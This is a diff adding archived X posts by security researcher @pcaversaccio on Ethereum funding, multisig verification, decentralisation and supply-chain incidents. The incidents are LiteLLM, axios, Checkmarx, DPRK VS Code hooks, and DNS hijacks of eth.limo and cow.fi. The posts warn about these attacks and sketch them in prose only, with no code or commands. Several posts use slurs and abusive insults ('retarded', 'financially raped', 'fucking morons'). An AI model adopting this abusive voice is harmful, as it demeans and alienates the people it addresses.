+> dude, it's the fucking opposite. we're not building safer systems. we're building systems so complex nobody actually understands them anymore. and almost nobody is asking the obvious question: **what can we remove?** everyone wants to add. nobody wants to reduce. that's how you end up in a nightmare system (hint: we're already in that nightmare). not because of one big failure. but because of thousands of tiny dependencies you never should have had in the first place.
+
+
+---
+
+## 2026-04-28 · Post · so GitHub claims all is operational, but my PRs are still not back! why are we all still running on 
+
+
+### Post — @pcaversaccio — 2026-04-28 11:01 UTC (2026-04-28 12:01 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2049081684105310221
+- Metrics (at fetch): bookmark 1, impression 3514, like 39, quote 0, reply 7, retweet 0
+
+> so GitHub claims all is operational, but my PRs are still not back! why are we all still running on this centralised, unreliable clown platform fml [pic.x.com/lL1LlErCkN]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HG_L6koaYAAdkD8.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HG_MUCabgAAzROF.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HG_MaCLaAAABpl9.jpg — no alt text provided by author
+
+
+---
+
+## 2026-04-28 · Post · just found an interesting thread from 2024 (https://farcaster.xyz/pcaversaccio/0x4a3e46a0). 
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-04-28 09:38 UTC (2026-04-28 10:38 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2049060562248810674
+- Metrics (at fetch): bookmark 5, impression 3710, like 63, quote 0, reply 9, retweet 3
+
+> just found an interesting thread from 2024 (https://farcaster.xyz/pcaversaccio/0x4a3e46a0). 
+> 1. Rollups are not sharding = well, i think we can now all agree on this take
+> 2. Shards are not secured by a multisig = well, i think we can now all agree on this take
+> 3. LayerZero being a temporary _patch_ for it = well, i think we can now all agree on this take
+>
+> thank you for listening
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HG-3Y3pbgAAEfCt.jpg — no alt text provided by author
+
+**Links in post:** https://farcaster.xyz/pcaversaccio/0x4a3e46a0
+
+
+---
+
+## 2026-04-26 · Post · look guys, i'm fine if people argue against this, but what actually fucks me up is how fast people d
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-04-26 09:02 UTC (2026-04-26 10:02 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2048326873638170956
+- Metrics (at fetch): bookmark 6, impression 10862, like 134, quote 0, reply 20, retweet 10
+
+> look guys, i'm fine if people argue against this, but what actually fucks me up is how fast people default to lazy dismissals, where the fuck did the contrarian mindset go in this space? you seriously prefer getting paid the tradfi clown way while arguing for CROPS principles here? are you all fucking insane??? xmr devs are paid in xmr for example. if eth is supposed to mean anything, we should be pushing hard to use eth as real payment, and that includes the ef having the guts to run its own ops on-chain, you can easily cow swap eth to dai if you want usd, instead of hiding behind safe excuses and pretending it's impossible, otherwise what are we even doing here?
+
+**Links in post:** https://twitter.com/pcaversaccio/status/2047705308655677666
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-04-24 15:52 UTC (2026-04-24 16:52 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2047705308655677666
+    - Metrics (at fetch): bookmark 14, impression 40752, like 277, quote 6, reply 31, retweet 17
+    
+    > the EF should lead by example and pay everything of "This sale funds the EF’s core operations & activities, including protocol R&D, ecosystem development, community grant funding and more" via ETH (or, if requested, via DAI). it makes zero fucking sense to convert ETH into fiat - like use the currency you created lmfaoo. i would go even further that the EF should have an internal policy that any payments should be done via ETH. period.
+    
+    **Links in post:** https://twitter.com/ethereumfndn/status/2047685166966161659
+    
+    **Quoted post (full text):**
+    
+        #### Quoted post — @1529875152460193794 — 2026-04-24 14:32 UTC (2026-04-24 15:32 WAT)
+        
+        - URL: https://x.com/1529875152460193794/status/2047685166966161659
+        - Metrics (at fetch): bookmark 75, impression 907353, like 1128, quote 200, reply 250, retweet 90
+        
+        > 0/ Today, the Ethereum Foundation finalized the terms of a 10,000 ETH sale at an average price of $2,387 via OTC.
+        >
+        > For this sale, our OTC counterparts was @BitMNR.
+        
+    
+
+
+---
+
+## 2026-04-24 · Post · the EF should lead by example and pay everything of "This sale funds the EF’s core operations & acti
+
+
+### Post — @pcaversaccio — 2026-04-24 15:52 UTC (2026-04-24 16:52 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2047705308655677666
+- Metrics (at fetch): bookmark 14, impression 40752, like 277, quote 6, reply 31, retweet 17
+
+> the EF should lead by example and pay everything of "This sale funds the EF’s core operations & activities, including protocol R&D, ecosystem development, community grant funding and more" via ETH (or, if requested, via DAI). it makes zero fucking sense to convert ETH into fiat - like use the currency you created lmfaoo. i would go even further that the EF should have an internal policy that any payments should be done via ETH. period.
+
+**Links in post:** https://twitter.com/ethereumfndn/status/2047685166966161659
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1529875152460193794 — 2026-04-24 14:32 UTC (2026-04-24 15:32 WAT)
+    
+    - URL: https://x.com/1529875152460193794/status/2047685166966161659
+    - Metrics (at fetch): bookmark 75, impression 907353, like 1128, quote 200, reply 250, retweet 90
+    
+    > 0/ Today, the Ethereum Foundation finalized the terms of a 10,000 ETH sale at an average price of $2,387 via OTC.
+    >
+    > For this sale, our OTC counterparts was @BitMNR.
+    
+
+
+---
+
+## 2026-04-24 · Post · basically all of my code is _open-source_ and _free_ to use; in most cases it's licensed under AGPL-
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2026-04-24 11:49 UTC (2026-04-24 12:49 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2047643994088169810
+- Metrics (at fetch): bookmark 25, impression 19475, like 187, quote 3, reply 1, retweet 33
+
+> basically all of my code is _open-source_ and _free_ to use; in most cases it's licensed under AGPL-3.0 so everything stays open & accessible forever. a lot of my code is used to protect millions or even billions in funds (e.g. my `safe-tx-hashes-util`), yet many projects still don't donate because i don't go through some retarded kyc process (guys, fuck u!), even though i actively help secure their systems & money (yeah fml). the Ethereum Security QF round will hopefully change that tbh.
+>
+> so i've submitted 2 applications:
+> - snekmate: i started snekmate in 2022 as its sole author and have poured thousands of hours into it over the past 3.5 years (1,200+ commits so far). its math functions are now even formally verified, it's used by Curve to help secure millions in funds, it's included in external integration tests in Foundry & Halmos (and has found various bugs already), and even used in the Vyper compiler itself (various bugs detected in the new venom IR because of this integration). it's essentially a one-person project that powers & ships essential Vyper modules to teams across the ecosystem.
+> - safe-tx-hashes-util: before the EF deploys capital into some defi protocols, the multisig txs are verified using my tool. before we deployed 69,420 ETH into staking at TheDAO, those multisig txs were verified with it. major protocols rely on it as a local-first verification layer for one of the most critical parts of any multisig: transaction correctness. i also recently shipped an easy-to-use Qubes template. so far i've received around ~$25k in donations, while this script alone has helped secure billions in funds.
+>
+> pls donate:
+> - snekmate: https://qf.giveth.io/project/snekmate
+> - safe-tx-hashes-util: https://qf.giveth.io/project/safe-multisig-transaction-hashes
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HGqvb0zaUAA_Vy9.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HGqvc1gbYAANrx1.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/Giveth/status/2047339433007915128, https://qf.giveth.io/project/snekmate, https://qf.giveth.io/project/safe-multisig-transaction-hashes
+
+**Quoted post (full text):**
+
+    #### Quoted post — @798810763586478080 — 2026-04-23 15:38 UTC (2026-04-23 16:38 WAT)
+    
+    - URL: https://x.com/798810763586478080/status/2047339433007915128
+    - Metrics (at fetch): bookmark 37, impression 129419, like 268, quote 50, reply 37, retweet 90
+    
+    > If you’re tired of watching exploits dominate the timeline, this is your moment to act.
+    >
+    > The Ethereum Security QF Round is LIVE!
+    >
+    > Support the people and projects securing Ethereum and its L2s.
+    >
+    > 500 ETH (~$1M+) in matching from @thedaofund.
+    >
+    > Explore & donate:
+    > https://qf.giveth.io/qf/ethereum-security
+    
+    **Media:**
+    - media `3_2047339427723087872` (details not returned by the API)
+    
+    **Links in post:** https://qf.giveth.io/qf/ethereum-security
+    
+
+
+---
+
+## 2026-04-23 · Post · 3 years of leading SEAL 911 taught me one thing: people do fucking NOT learn how to deal with crypto
+
+
+### Post — @pcaversaccio — 2026-04-23 13:23 UTC (2026-04-23 14:23 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2047305247585136772
+- Metrics (at fetch): bookmark 49, impression 25185, like 473, quote 6, reply 34, retweet 42
+
+> 3 years of leading SEAL 911 taught me one thing: people do fucking NOT learn how to deal with crypto until they've lost substantial money. there are no shortcuts. fucking none. some people literally must lose everything before it clicks that they should be using a fucking hww. i'm basically yelling into the void here, but 99.9999% of people are completely incapable of handling crypto safely until they've been financially raped.
+
+
+---
+
+## 2026-04-22 · Post · what an irony [pic.x.com/oB99UmwYMa] https://twitter.com/SocketSecurity/status/2046989336399290859
+
+
+### Post — @pcaversaccio — 2026-04-22 19:46 UTC (2026-04-22 20:46 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2047039483564958087
+- Metrics (at fetch): bookmark 2, impression 6225, like 53, quote 0, reply 4, retweet 4
+
+> what an irony [pic.x.com/oB99UmwYMa] https://twitter.com/SocketSecurity/status/2046989336399290859
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HGiLj_-WwAA92ML.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/SocketSecurity/status/2046989336399290859
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1458247940640690176 — 2026-04-22 16:27 UTC (2026-04-22 17:27 WAT)
+    
+    - URL: https://x.com/1458247940640690176/status/2046989336399290859
+    - Metrics (at fetch): bookmark 173, impression 187715, like 563, quote 36, reply 22, retweet 140
+    
+    > 🚨 BREAKING: Socket and @Docker uncovered what appears to be a broader Checkmarx supply chain compromise affecting official KICS Docker images and recent Checkmarx VS Code extension releases.
+    >
+    > We found malicious images in the official checkmarx/kics Docker Hub repo, including overwritten tags and a new tag outside the normal release flow. 
+    >
+    > Our analysis also found signs that recent Checkmarx extension releases introduced code capable of downloading and executing what appears to be a malicious remote addon.
+    >
+    > We’re in touch with the Checkmarx team and still investigating the incident.
+    
+
+
+---
+
+## 2026-04-21 · Post · the negative and positive things that have happened since saturday are the result of _centralised_ p
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2026-04-21 08:47 UTC (2026-04-21 09:47 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2046511172078444998
+- Metrics (at fetch): bookmark 18, impression 17714, like 241, quote 5, reply 22, retweet 34
+
+> the negative and positive things that have happened since saturday are the result of _centralised_ points of building. everything that has happened (the bad and good things) would not have happened if we built in a truly decentralised way. overall, dprk would have far fewer "gains" if we stuck to cypherpunk principles. like, dprk does _not_ focus on smart contract hacks, they almost exclusively target centralised attack vectors. if we want to win against dprk (and any other state actor, which all focus on web2-based attack vectors), we need to go full cypherpunk mode. if this is not a wake up call, i do not think we will get a second chance.
+
+
+---
+
+## 2026-04-20 · Post · guys it cannot be this hard. rotki is awesome local-first, open-source software. it's a perfect cyph
+
+
+### Post — @pcaversaccio — 2026-04-20 11:21 UTC (2026-04-20 12:21 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2046187571730960674
+- Metrics (at fetch): bookmark 8, impression 7720, like 71, quote 0, reply 3, retweet 8
+
+> guys it cannot be this hard. rotki is awesome local-first, open-source software. it's a perfect cypherpunk move to sponsor their releases. so pls do this now. https://t.co/zSl9Tg68nr
+
+**Quoted post (full text):**
+
+    #### Quoted post — @43949721 — 2026-04-20 11:04 UTC (2026-04-20 12:04 WAT)
+    
+    - URL: https://x.com/43949721/status/2046183187806560286
+    - Metrics (at fetch): bookmark 1, impression 10261, like 36, quote 1, reply 4, retweet 5
+    
+    > Next rotki release is so far sponsored by 3 people.
+    >
+    > With @pcaversaccio taking 1/2 gold spots front and center inside the app itself!
+    >
+    > We are soon rolling the sponsoring nfts over so if you want to grab a spot your time is running out to secure the cute blacksmith rotkis NFT! https://t.co/FDvXiSFBS9
+    
+    **Media:**
+    - media `3_2046182566110048256` (details not returned by the API)
+    - media `3_2046182588587323392` (details not returned by the API)
+    
+
+
+---
+
+## 2026-04-19 · Post · we've been digging our own grave with all this shit protocols and products. fun fact is that if we r
+
+
+### Post — @pcaversaccio — 2026-04-19 14:55 UTC (2026-04-19 15:55 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2045878852149248145
+- Metrics (at fetch): bookmark 6, impression 15124, like 235, quote 4, reply 21, retweet 22
+
+> we've been digging our own grave with all this shit protocols and products. fun fact is that if we really built more in a true cypherpunk style, DPRK and any web2-focused threat actor would have way less attack vectors and we would have very likely way less losses.
+
+
+---
+
+## 2026-04-19 · Post · bridges another great example lol https://t.co/CcKUbw7NVk
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-04-19 11:45 UTC (2026-04-19 12:45 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2045831034898374974
+- Metrics (at fetch): bookmark 2, impression 4964, like 48, quote 0, reply 1, retweet 4
+
+> bridges another great example lol https://t.co/CcKUbw7NVk
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-04-17 13:24 UTC (2026-04-17 14:24 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2045131226395341032
+    - Metrics (at fetch): bookmark 18, impression 23365, like 248, quote 8, reply 8, retweet 38
+    
+    > i never understood why people reject a bit of extra friction when a _single_ wrong move can cost millions; like you're optimising for the wrong things folks. example: i don't want one-click solutions for my multisig storage; i want a multi-layer, _intentional_-friction,
+    
+
+
+---
+
+## 2026-04-19 · Post · i keep reading all of these messages/tweets etc. where people really think having "2 required DVNs" 
+
+
+### Post — @pcaversaccio — 2026-04-19 07:27 UTC (2026-04-19 08:27 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2045766157731258435
+- Metrics (at fetch): bookmark 17, impression 17681, like 265, quote 1, reply 10, retweet 30
+
+> i keep reading all of these messages/tweets etc. where people really think having "2 required DVNs" is better. what is wrong with all of you fucking morons? you fucking build trusted centralised clownshows and think adding an additional signer is the way to go, lmfaoooo, i enjoy
+
+
+---
+
 ## 2026-04-18 · Post · i mean it doesn't matter how this all turns out but why do we as an industry still run defi and brid
 
 
@@ -214,15 +2253,202 @@ Tags (automatic): Smart contract / DeFi
 
 ---
 
+## 2026-04-18 · Post · eth[.]limo DNS is compromised. do NOT interact! https://t.co/jIOV208zJq
+
+
+### Post — @pcaversaccio — 2026-04-18 08:59 UTC (2026-04-18 09:59 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2045427019786461530
+- Metrics (at fetch): bookmark 19, impression 22641, like 173, quote 5, reply 7, retweet 38
+
+> eth[.]limo DNS is compromised. do NOT interact! https://t.co/jIOV208zJq
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HGLRAboacAAi411.jpg — no alt text provided by author
+
+
+---
+
 ## 2026-04-17 · Post · i never understood why people reject a bit of extra friction when a _single_ wrong move can cost mil
 
 
 ### Post — @pcaversaccio — 2026-04-17 13:24 UTC (2026-04-17 14:24 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2045131226395341032
-- Metrics (at fetch): bookmark 18, impression 23364, like 248, quote 8, reply 8, retweet 38
+- Metrics (at fetch): bookmark 18, impression 23365, like 248, quote 8, reply 8, retweet 38
 
 > i never understood why people reject a bit of extra friction when a _single_ wrong move can cost millions; like you're optimising for the wrong things folks. example: i don't want one-click solutions for my multisig storage; i want a multi-layer, _intentional_-friction,
+
+
+---
+
+## 2026-04-16 · Post · i spent the last two days building a hardened Qubes OS salt config for my `safe-tx-hashes-util` veri
+
+
+### Post — @pcaversaccio — 2026-04-16 08:58 UTC (2026-04-16 09:58 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2044701986805973032
+- Metrics (at fetch): bookmark 28, impression 11011, like 104, quote 4, reply 10, retweet 6
+
+> i spent the last two days building a hardened Qubes OS salt config for my `safe-tx-hashes-util` verification script. think infra-as-code, but for app qubes. it sets up a minimal, reproducible template vm that you can use to spin up an app vm specifically for verifying Safe tx https://t.co/amNyKnZpyj
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HGA74lcbkAANcBD.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HGA75seagAAtkZ0.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HGA8Fx-b0AExD4k.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HGA9RuCasAA3bEI.png — no alt text provided by author
+
+
+---
+
+## 2026-04-14 · Post · cow[.]fi (CoW Swap) UI (and probably DNS) is compromised. do NOT interact! https://t.co/wTV9qq7Bmj
+
+
+### Post — @pcaversaccio — 2026-04-14 15:45 UTC (2026-04-14 16:45 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2044079587798417564
+- Metrics (at fetch): bookmark 59, impression 119602, like 581, quote 34, reply 28, retweet 161
+
+> cow[.]fi (CoW Swap) UI (and probably DNS) is compromised. do NOT interact! https://t.co/wTV9qq7Bmj
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HF4HXTZasAYOppj.png — no alt text provided by author
+
+
+---
+
+## 2026-04-13 · Post · modern-day software fucking ignores auditability, making independent verification basically impossib
+
+
+### Post — @pcaversaccio — 2026-04-13 19:04 UTC (2026-04-13 20:04 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2043767396985647212
+- Metrics (at fetch): bookmark 0, impression 3917, like 53, quote 1, reply 8, retweet 4
+
+> modern-day software fucking ignores auditability, making independent verification basically impossible for individuals. instead of empowering people, it traps them in systems they can't understand or verify. write your next project in a single file. try it.
+
+
+---
+
+## 2026-04-11 · Post · Linus created Git in 2005. i've been waiting for him to catch up since 1983. https://t.co/LwKYfnVbVl
+
+
+### Post — @pcaversaccio — 2026-04-11 18:23 UTC (2026-04-11 19:23 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2043032196471230905
+- Metrics (at fetch): bookmark 10, impression 15281, like 54, quote 0, reply 5, retweet 2
+
+> Linus created Git in 2005. i've been waiting for him to catch up since 1983. https://t.co/LwKYfnVbVl https://t.co/y8wn2fIOkH
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HFpM4tPakAQD-VI.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-04-10 10:11 UTC (2026-04-10 11:11 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2042545890842321051
+    - Metrics (at fetch): bookmark 58, impression 29448, like 130, quote 5, reply 7, retweet 26
+    
+    > recently we've started to observe that the DPRK threat actor PolinRider (related to the Contagious Interview guys) is poisoning hundreds of old GitHub repos with "old-looking" but malicious commits that were actually pushed _recently_. i think what is happening overall is the https://t.co/5yxGVi6gRo https://t.co/SkzWGrAOMN
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HFiS8XJbYAAGQz4.jpg — no alt text provided by author
+    - photo: https://pbs.twimg.com/media/HFiS9kDakAY7Yhq.jpg — no alt text provided by author
+    
+    **Quoted post (full text):**
+    
+        #### Quoted post — @pcaversaccio — 2026-01-10 10:13 UTC (2026-01-10 11:13 WAT)
+        
+        - URL: https://x.com/pcaversaccio/status/2009931485202055168
+        - Metrics (at fetch): bookmark 1072, impression 374290, like 2145, quote 90, reply 166, retweet 292
+        
+        > i genuinely think everyone in this space should immediately switch to using Vim. DPRK started abusing VS Code hooks that run _automatically_ in the background when you open a folder. ZERO fucking user interaction required _after_ trusting the repo (the trusting part is important here). Yes, read it again. ZERO. INTERACTION. REQUIRED.
+        >
+        > so what happens is the following: they (in the usual case the Contagious Interview group, meaning some fake recruiting guy) share GitHub, Bitbucket, and GitLab repos containing a `.vscode/` subdirectory with malicious hooks. the one example I share here executes a fake font that's actually heavily-obfuscated JS and will absolutely rek you.
+        >
+        > all your fancy software that feels "convenient" makes tradeoffs. those tradeoffs are now being abused to silently rek your devices.
+        >
+        > use Vim. and use Qubes. Thx.
+        
+        **Media:**
+        - photo: https://pbs.twimg.com/media/G-SyFbrbUAAVweq.jpg — no alt text provided by author
+        - photo: https://pbs.twimg.com/media/G-Szc57bMAAc0RI.jpg — no alt text provided by author
+        
+    
+
+
+---
+
+## 2026-04-10 · Post · recently we've started to observe that the DPRK threat actor PolinRider (related to the Contagious I
+
+
+### Post — @pcaversaccio — 2026-04-10 10:11 UTC (2026-04-10 11:11 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2042545890842321051
+- Metrics (at fetch): bookmark 58, impression 29448, like 130, quote 5, reply 7, retweet 26
+
+> recently we've started to observe that the DPRK threat actor PolinRider (related to the Contagious Interview guys) is poisoning hundreds of old GitHub repos with "old-looking" but malicious commits that were actually pushed _recently_. i think what is happening overall is the https://t.co/5yxGVi6gRo https://t.co/SkzWGrAOMN
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HFiS8XJbYAAGQz4.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HFiS9kDakAY7Yhq.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-01-10 10:13 UTC (2026-01-10 11:13 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2009931485202055168
+    - Metrics (at fetch): bookmark 1072, impression 374290, like 2145, quote 90, reply 166, retweet 292
+    
+    > i genuinely think everyone in this space should immediately switch to using Vim. DPRK started abusing VS Code hooks that run _automatically_ in the background when you open a folder. ZERO fucking user interaction required _after_ trusting the repo (the trusting part is important here). Yes, read it again. ZERO. INTERACTION. REQUIRED.
+    >
+    > so what happens is the following: they (in the usual case the Contagious Interview group, meaning some fake recruiting guy) share GitHub, Bitbucket, and GitLab repos containing a `.vscode/` subdirectory with malicious hooks. the one example I share here executes a fake font that's actually heavily-obfuscated JS and will absolutely rek you.
+    >
+    > all your fancy software that feels "convenient" makes tradeoffs. those tradeoffs are now being abused to silently rek your devices.
+    >
+    > use Vim. and use Qubes. Thx.
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/G-SyFbrbUAAVweq.jpg — no alt text provided by author
+    - photo: https://pbs.twimg.com/media/G-Szc57bMAAc0RI.jpg — no alt text provided by author
+    
+
+
+---
+
+## 2026-04-04 · Post · going forward I will request from every external contributor to my repos a nice Kim Jong Un insult; 
+
+
+### Post — @pcaversaccio — 2026-04-04 19:35 UTC (2026-04-04 20:35 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2040513628936581149
+- Metrics (at fetch): bookmark 142, impression 86153, like 845, quote 11, reply 20, retweet 41
+
+> going forward I will request from every external contributor to my repos a nice Kim Jong Un insult; it's an easy but powerful way to prevent DPRK dev code (and some of them are really good) to be merged (they will never ever get the approval to do this). this guy passed it https://t.co/Ms86or5GiP
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HFFbiBGbcAAhOAY.jpg — no alt text provided by author
+
+
+---
+
+## 2026-04-02 · Post · it's a remarkable milestone for anyone working on compilers and smart contract security: Vyper is se
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2026-04-02 11:06 UTC (2026-04-02 12:06 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2039660696225677619
+- Metrics (at fetch): bookmark 163, impression 144544, like 835, quote 17, reply 212, retweet 120
+
+> it's a remarkable milestone for anyone working on compilers and smart contract security: Vyper is set to become the _first_ formally verified smart contract compiler, effectively allowing you to mathematically prove that the entire compilation pipeline preserves the contract https://t.co/45HPgqcLx7
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HE5SS03aoAAmizr.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HE5TjXGaMAA8qa7.jpg — no alt text provided by author
 
 
 ---
@@ -243,6 +2469,282 @@ Tags (automatic): Smart contract / DeFi
 
 ---
 
+## 2026-04-01 · Post · it's so painful to watch that you guys are one compromised endpoint away from being completely rekt 
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2026-04-01 13:29 UTC (2026-04-01 14:29 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2039334285573025860
+- Metrics (at fetch): bookmark 24, impression 10483, like 85, quote 1, reply 8, retweet 9
+
+> it's so painful to watch that you guys are one compromised endpoint away from being completely rekt (tbf there are other endpoints as well, like the Foundry one, but Claude is used at a larger scale). just as a reminder you're literally giving _arbitrary_ internet bytes root https://t.co/56tSXzAGke
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HE0pEWXawAAJ0pL.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HE0pcGrboAA6UKz.png — no alt text provided by author
+
+
+---
+
+## 2026-04-01 · Post · yesterday it was axios, next time it will be a compromised package manager like `pnpm`, a highly tru
+
+
+### Post — @pcaversaccio — 2026-04-01 11:03 UTC (2026-04-01 12:03 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2039297558187827646
+- Metrics (at fetch): bookmark 16, impression 7733, like 94, quote 0, reply 7, retweet 7
+
+> yesterday it was axios, next time it will be a compromised package manager like `pnpm`, a highly trusted tool with deep system access that could silently hand over your entire machine to an attacker. security through compartmentalisation is the _only_ way forward.
+
+
+---
+
+## 2026-04-01 · Post · Ethereum is dead, long live Cardano https://t.co/qjLyPnhf4T
+
+
+### Post — @pcaversaccio — 2026-04-01 09:45 UTC (2026-04-01 10:45 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2039278088585158788
+- Metrics (at fetch): bookmark 8, impression 8821, like 41, quote 0, reply 6, retweet 2
+
+> Ethereum is dead, long live Cardano https://t.co/qjLyPnhf4T
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HEz4eQVbgAAvoN0.jpg — no alt text provided by author
+
+
+---
+
+## 2026-03-31 · Post · 7 days ago i wrote: "it's not a question of if a foundational package gets widely compromised; it's 
+
+
+### Post — @pcaversaccio — 2026-03-31 09:35 UTC (2026-03-31 10:35 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2038913183474414007
+- Metrics (at fetch): bookmark 22, impression 8093, like 68, quote 0, reply 3, retweet 8
+
+> 7 days ago i wrote: "it's not a question of if a foundational package gets widely compromised; it's _when_. and when it happens, the only thing that fucking matters is whether your system was designed to survive it."
+>
+> today we got axios. i know you all don't want to listen to me, https://t.co/rD0UCJFPpp
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-03-24 17:49 UTC (2026-03-24 18:49 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2036500713992495201
+    - Metrics (at fetch): bookmark 21, impression 16057, like 55, quote 1, reply 3, retweet 2
+    
+    > the only sustainable threat model you must follow IMHO is "when I get compromised one day, do I actually lose anything?" this package was downloaded ~95m times last month. it sits deep in the dependency graph of many packages, i.e. it propagates fast. that's how you get https://t.co/dyb5ZlvQBB https://t.co/7PYadIEmGf
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HEMYNbPaIAA0e0O.jpg — no alt text provided by author
+    - photo: https://pbs.twimg.com/media/HEMYheSaIAAdFE6.jpg — no alt text provided by author
+    
+    **Quoted post (full text):**
+    
+        #### Quoted post — @2647149458 — 2026-03-24 12:06 UTC (2026-03-24 13:06 WAT)
+        
+        - URL: https://x.com/2647149458/status/2036414330267193815
+        - Metrics (at fetch): bookmark 2898, impression 5924981, like 9182, quote 605, reply 294, retweet 2191
+        
+        > LiteLLM HAS BEEN COMPROMISED, DO NOT UPDATE. We just discovered that LiteLLM pypi release 1.82.8. It has been compromised, it contains litellm_init.pth with base64 encoded instructions to send all the credentials it can find to remote server + self-replicate. link below
+        
+    
+
+
+---
+
+## 2026-03-27 · Post · if you need a cult, you're not a cypherpunk, you're outsourcing your thinking
+
+
+### Post — @pcaversaccio — 2026-03-27 09:30 UTC (2026-03-27 10:30 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2037462150416097506
+- Metrics (at fetch): bookmark 13, impression 14085, like 343, quote 5, reply 24, retweet 30
+
+> if you need a cult, you're not a cypherpunk, you're outsourcing your thinking
+
+
+---
+
+## 2026-03-26 · Post · i use xmr to pay for vpn, vps, domains, giftcards, donations, hardware devices (sometimes also btc; 
+
+
+### Post — @pcaversaccio — 2026-03-26 09:48 UTC (2026-03-26 10:48 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2037104337382764652
+- Metrics (at fetch): bookmark 89, impression 18192, like 309, quote 3, reply 21, retweet 14
+
+> i use xmr to pay for vpn, vps, domains, giftcards, donations, hardware devices (sometimes also btc; swapped from xmr) and many other things. i don't use eth or stablecoins for any payments. when it comes to accepted payment methods (particularly related to technical services) and
+
+
+---
+
+## 2026-03-24 · Post · the only sustainable threat model you must follow IMHO is "when I get compromised one day, do I actu
+
+
+### Post — @pcaversaccio — 2026-03-24 17:49 UTC (2026-03-24 18:49 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2036500713992495201
+- Metrics (at fetch): bookmark 21, impression 16057, like 55, quote 1, reply 3, retweet 2
+
+> the only sustainable threat model you must follow IMHO is "when I get compromised one day, do I actually lose anything?" this package was downloaded ~95m times last month. it sits deep in the dependency graph of many packages, i.e. it propagates fast. that's how you get https://t.co/dyb5ZlvQBB https://t.co/7PYadIEmGf
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HEMYNbPaIAA0e0O.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HEMYheSaIAAdFE6.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2647149458 — 2026-03-24 12:06 UTC (2026-03-24 13:06 WAT)
+    
+    - URL: https://x.com/2647149458/status/2036414330267193815
+    - Metrics (at fetch): bookmark 2898, impression 5924981, like 9182, quote 605, reply 294, retweet 2191
+    
